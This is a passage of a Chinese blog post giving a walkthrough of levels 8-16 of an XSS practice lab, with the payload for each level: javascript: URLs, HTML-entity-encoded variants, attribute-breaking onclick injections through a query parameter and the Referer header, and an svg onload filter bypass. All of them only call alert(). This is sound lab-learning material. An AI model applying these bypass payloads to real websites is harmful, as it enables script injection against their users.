+<h6 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/xss/)</span><br><span class="line">使用hackbar插件</span><br><span class="line">XSS的HTML编码</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117154919384.png" alt="image-20240117154919384"></p>
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117154737219.png" alt="image-20240117154737219"></p>
+<h6 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/xss/)/* http:// */</span><br><span class="line">使用hackbar插件</span><br><span class="line">XSS的HTML编码</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;/* http:// */</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117155901370.png" alt="image-20240117155901370"></p>
+<h6 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://xss.tesla-space.com/level10.php?t_sort=%22%20onclick=%27alert(1)%27%20type=%22text</span><br><span class="line"></span><br><span class="line">?t_sort=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117161018651.png" alt="image-20240117161018651"></p>
+<h6 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用HackBar插件，勾选Referer,其余和上一关一样</span><br><span class="line">?t_sort=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117162731564.png" alt="image-20240117162731564"></p>
+<p>level12</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">F12找到位置直接输?t_sort=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br><span class="line">&lt;input name=&quot;t_sort&quot; type=&quot;text&quot; value=&quot;?t_sort=&quot; onclick=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117165557794.png" alt="image-20240117165557794"></p>
+<h6 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">F12找到位置直接输?t_sort=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br><span class="line">&lt;input name=&quot;t_sort&quot; type=&quot;text&quot; value=&quot;?t_sort=&quot; onclick=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117165806471.png" alt="image-20240117165806471"></p>
+<h6 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h6><h6 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h6><h6 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://xss.tesla-space.com/level16.php?keyword=%3Csvg%0Aonload=alert(1)%3E</span><br><span class="line"></span><br><span class="line">?keyword=&lt;svg%0Aonload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hkbijihxl/PicGo/main/image-20240117173702811.png" alt="image-20240117173702811"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2024/01/16/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-XSS/" title="跨站脚本攻击_XSS" target="_blank" rel="external">http://example.com/2024/01/16/跨站脚本攻击-XSS/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/hkbijihxl" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/hkbijihxl" target="_blank"><span class="text-dark">hkbijihxl</span><small class="ml-1x">汀花雨细，水树风闲，又是秋来。</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2024/01/19/beef/" title="beef"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2024/01/12/%E9%9D%B6%E6%9C%BA-Hackademic/" title="靶机_Hackademic"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>Maybe you could buy me a cup of coffee.</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="Scan Qrcode" title="Scan" />
+              </div>
+              <p class="text-muted mv">Scan this qrcode</p>
+              <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/hkbijihxl" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://weibo.com/u/7832381828" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
